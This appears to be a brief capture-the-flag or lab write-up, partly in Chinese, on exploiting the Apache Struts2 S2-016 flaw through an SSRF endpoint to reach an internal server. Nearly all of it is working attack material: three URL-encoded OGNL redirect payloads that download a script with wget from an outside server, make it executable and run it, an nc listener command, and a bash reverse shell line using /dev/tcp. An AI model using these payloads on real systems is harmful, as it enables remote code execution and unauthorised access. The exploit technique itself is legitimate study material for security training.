## Struts2
利用S2-016從 http://ssrf.orange.tw:81/ 攻擊 http://172.20.0.6:8080/ 的Apache Struts2
server，使用bash做reverse shell，將reverse shell command包在script內，從server以wget下載script再執行，encode時要encode兩次

### Target
POST: `url=http://172.20.0.6:8080/index.action?redirect:$%7B(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B'wget','http://my.http.server/revsh.sh'%7D)).start()%7D`

POST : `url=http://172.20.0.6:8080/index.action?redirect:$%7B(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B'chmod','777','revsh.sh'%7D)).start()%7D`

POST : `url=http://172.20.0.6:8080/index.action?redirect:$%7B(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B'./revsh.sh'%7D)).start()%7D`
#### Server
```
$ nc -lvp 5678
```
#### Script
```sh
#!/bin/bash
bash -i >& /dev/tcp/SERVER_IP/5678 0>&1
```
